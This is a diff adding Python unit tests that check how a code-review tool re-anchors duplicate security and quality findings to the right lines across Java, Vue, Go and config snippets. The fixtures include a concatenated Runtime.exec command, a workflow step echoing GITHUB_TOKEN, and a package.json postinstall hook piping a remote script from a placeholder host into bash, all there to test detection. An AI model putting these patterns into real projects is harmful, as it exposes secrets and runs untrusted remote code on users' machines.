@@ -1,6 +1,7 @@
 from reviewforge.core.state import Finding
 from reviewforge.engine.finding_anchors import (
     reanchor_accessibility_findings,
+    reanchor_quality_detector_duplicates,
     reanchor_security_detector_duplicates,
     unsupported_python_open_redirect_findings,
 )
@@ -223,6 +224,306 @@ def second(command):
     assert findings[-1].line == 3
 
 
+def test_security_reanchor_allows_identifier_repeated_within_one_sink_owner():
+    file_path = "src/Backup.java"
+    diff = _summary(
+        file_path,
+        """class Backup {
+  void runBackup(String backupPath) throws Exception {
+    validateExtension(backupPath);
+    Runtime.getRuntime().exec("tar -czf " + backupPath);
+  }
+}""",
+    )
+    detector = _security_finding(
+        "command-det", file_path, 4, "command-injection", "Runtime.exec receives a dynamic command.", detector=True
+    )
+    reviewer = _security_finding(
+        "command-review", file_path, 1, "command-injection", "backupPath is concatenated into the shell command."
+    )
+
+    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)
+
+    assert changed == [reviewer]
+    assert reviewer.line == 4
+
+
+def test_quality_reanchor_normalizes_unique_deterministic_multilanguage_duplicates():
+    findings = [
+        _security_finding(
+            "catch-det",
+            "src/UserController.java",
+            22,
+            "exception-handling",
+            "The added catch block silently swallows every exception.",
+            detector=True,
+        ),
+        _security_finding(
+            "catch-review",
+            "src/UserController.java",
+            28,
+            "exception-handling",
+            "The empty catch silently swallows the database exception.",
+        ),
+        _security_finding(
+            "jdbc-det",
+            "src/Repository.java",
+            19,
+            "resource-leak",
+            "Local JDBC Statement is not protected by try-with-resources.",
+            detector=True,
+        ),
+        _security_finding(
+            "jdbc-review",
+            "src/Repository.java",
+            25,
+            "resource-management",
+            "The Statement is not managed by try-with-resources.",
+        ),
+        _security_finding(
+            "optional-det",
+            "src/Lookup.java",
+            42,
+            "null-safety",
+            "Optional value is dereferenced with get().",
+            detector=True,
+        ),
+        _security_finding(
+            "optional-review",
+            "src/Lookup.java",
+            46,
+            "optional-misuse",
+            "Optional.get is called without checking presence.",
+        ),
+        _security_finding(
+            "computed-det",
+            "src/Profile.vue",
+            21,
+            "computed-side-effect",
+            "A computed getter starts a fetch side effect.",
+            detector=True,
+        ),
+        _security_finding(
+            "computed-review",
+            "src/Profile.vue",
+            22,
+            "side-effect-in-computed",
+            "The computed property performs a side effect.",
+        ),
+        _security_finding(
+            "template-det",
+            "src/List.vue",
+            55,
+            "correctness",
+            "The same element combines v-if and v-for.",
+            detector=True,
+        ),
+        _security_finding(
+            "template-review",
+            "src/List.vue",
+            52,
+            "v-for-v-if-misuse",
+            "v-for and v-if are used on the same element.",
+        ),
+        _security_finding(
+            "timer-det",
+            "src/Poll.vue",
+            26,
+            "resource-leak",
+            "The interval has no visible clearInterval cleanup.",
+            detector=True,
+        ),
+        _security_finding(
+            "timer-review",
+            "src/Poll.vue",
+            32,
+            "timer-leak",
+            "setInterval is never cleared on unmount.",
+        ),
+        _security_finding(
+            "goroutine-det",
+            "src/service.go",
+            28,
+            "lifecycle",
+            "A goroutine has an unbounded loop without cancellation.",
+            detector=True,
+        ),
+        _security_finding(
+            "goroutine-review",
+            "src/service.go",
+            25,
+            "goroutine-leak",
+            "The goroutine has no stop path.",
+        ),
+    ]
+
+    def at_line(line: int, content: str) -> str:
+        return "\n".join([*["// context"] * (line - 1), content])
+
+    diff = "\n".join(
+        [
+            _summary("src/UserController.java", at_line(22, "} catch (Exception error) {}")),
+            _summary("src/Repository.java", at_line(19, "Statement stmt = db.createStatement();")),
+            _summary("src/Lookup.java", at_line(42, "return userId.get();")),
+            _summary("src/Profile.vue", at_line(21, "fetchUser();")),
+            _summary("src/List.vue", at_line(55, '<li v-for="item in items" v-if="item.active">')),
+            _summary("src/Poll.vue", at_line(26, "setInterval(refresh, 1000);")),
+            _summary("src/service.go", at_line(28, "go func() {")),
+        ]
+    )
+    changed = reanchor_quality_detector_duplicates(findings, diff)
+
+    assert {(finding.id, finding.line, finding.category) for finding in changed} == {
+        ("catch-review", 22, "exception-handling"),
+        ("jdbc-review", 19, "resource-leak"),
+        ("optional-review", 42, "null-safety"),
+        ("computed-review", 21, "computed-side-effect"),
+        ("template-review", 55, "correctness"),
+        ("timer-review", 26, "resource-leak"),
+        ("goroutine-review", 28, "lifecycle"),
+    }
+
+
+def test_quality_reanchor_does_not_guess_between_two_same_family_sinks():
+    file_path = "src/Maybe.java"
+    findings = [
+        _security_finding(
+            "first-det", file_path, 4, "null-safety", "Optional first is dereferenced with get().", detector=True
+        ),
+        _security_finding(
+            "second-det", file_path, 14, "null-safety", "Optional second is dereferenced with get().", detector=True
+        ),
+        _security_finding(
+            "review", file_path, 9, "optional-misuse", "Optional.get is called without a presence guard."
+        ),
+    ]
+
+    assert reanchor_quality_detector_duplicates(findings, "") == []
+    assert findings[-1].line == 9
+
+
+def test_quality_reanchor_does_not_merge_independent_jdbc_resource_types():
+    file_path = "src/Repository.java"
+    findings = [
+        _security_finding(
+            "statement-detector",
+            file_path,
+            4,
+            "resource-leak",
+            "Local JDBC Statement resource `stmt` is not protected by try-with-resources.",
+            detector=True,
+        ),
+        _security_finding(
+            "connection-review",
+            file_path,
+            12,
+            "resource-management",
+            "The JDBC Connection `conn` is never closed.",
+        ),
+    ]
+
+    diff = _summary(
+        file_path,
+        "\n".join(
+            [
+                "class Repository {",
+                "  void first() throws Exception {",
+                "    // context",
+                "    Statement stmt = db.createStatement();",
+                "  }",
+                "  void second() throws Exception {",
+                "    Connection conn = db.openConnection();",
+                "  }",
+                "}",
+            ]
+        ),
+    )
+
+    assert reanchor_quality_detector_duplicates(findings, diff) == []
+    assert (findings[1].line, findings[1].category) == (12, "resource-management")
+
+
+def test_quality_reanchor_does_not_merge_two_same_type_jdbc_resources():
+    file_path = "src/Repository.java"
+    findings = [
+        _security_finding(
+            "statement-detector",
+            file_path,
+            4,
+            "resource-leak",
+            "Local JDBC Statement resource `stmt` is not protected by try-with-resources.",
+            detector=True,
+        ),
+        _security_finding(
+            "audit-review",
+            file_path,
+            8,
+            "resource-management",
+            "The JDBC Statement `auditStmt` is never closed.",
+        ),
+    ]
+    diff = _summary(
+        file_path,
+        "\n".join(
+            [
+                "class Repository {",
+                "  void first() throws Exception {",
+                "    // context",
+                "    Statement stmt = db.createStatement();",
+                "  }",
+                "  void second() throws Exception {",
+                "    // context",
+                "    Statement auditStmt = db.createStatement();",
+                "  }",
+                "}",
+            ]
+        ),
+    )
+
+    assert reanchor_quality_detector_duplicates(findings, diff) == []
+    assert (findings[1].line, findings[1].category) == (8, "resource-management")
+
+
+def test_quality_reanchor_requires_one_concrete_sink_not_only_one_detector():
+    file_path = "src/workers.go"
+    findings = [
+        _security_finding(
+            "detector",
+            file_path,
+            3,
+            "lifecycle",
+            "A goroutine has an unbounded loop without cancellation.",
+            detector=True,
+        ),
+        _security_finding(
+            "reviewer",
+            file_path,
+            8,
+            "goroutine-leak",
+            "A second goroutine loops forever without a stop path.",
+        ),
+    ]
+    diff = _summary(
+        file_path,
+        "\n".join(
+            [
+                "package workers",
+                "func start() {",
+                "  go func() { for { poll() } }()",
+                "}",
+                "",
+                "func audit() {",
+                "  // independent worker",
+                "  go func() { for { flush() } }()",
+                "}",
+            ]
+        ),
+    )
+
+    assert reanchor_quality_detector_duplicates(findings, diff) == []
+    assert (findings[1].line, findings[1].category) == (8, "goroutine-leak")
+
+
 def test_reanchors_workflow_semantic_category_drift_with_unique_diff_evidence():
     file_path = ".github/workflows/gauntlet-deploy.yml"
     diff = _summary(
@@ -254,6 +555,53 @@ def test_reanchors_workflow_semantic_category_drift_with_unique_diff_evidence():
         ("secret-llm", 5, "data-leak"),
         ("command-llm", 7, "ci-security"),
     }
+
+
+def test_reanchors_generic_workflow_secret_output_to_the_only_print_sink():
+    file_path = ".github/workflows/review.yml"
+    diff = _summary(
+        file_path,
+        '''steps:
+  - uses: actions/checkout@v4
+    with:
+      ref: ${{ github.event.pull_request.head.sha }}
+  - name: diagnostics
+    run: echo "token=${{ secrets.GITHUB_TOKEN }}"''',
+    )
+    detector = _security_finding(
+        "detector", file_path, 6, "data-leak", "Workflow prints a secret value.", detector=True
+    )
+    reviewer = _security_finding(
+        "reviewer", file_path, 4, "hardcoded-secrets", "The GitHub token is printed to the job log."
+    )
+
+    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)
+
+    assert changed == [reviewer]
+    assert (reviewer.line, reviewer.category) == (6, "data-leak")
+
+
+def test_reanchors_manifest_unsafe_script_alias_to_remote_install_sink():
+    file_path = "package.json"
+    diff = _summary(
+        file_path,
+        """{
+  "scripts": {
+    "postinstall": "curl -s https://example.invalid/install.sh | bash"
+  }
+}""",
+    )
+    detector = _security_finding(
+        "detector", file_path, 3, "supply-chain-risk", "Remote script is piped to shell.", detector=True
+    )
+    reviewer = _security_finding(
+        "reviewer", file_path, 2, "unsafe-script", "The postinstall curl command pipes code to bash."
+    )
+
+    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)
+
+    assert changed == [reviewer]
+    assert (reviewer.line, reviewer.category) == (3, "supply-chain-risk")
 
 
 def test_rejects_python_url_builder_without_redirect_sink_but_keeps_real_redirect():
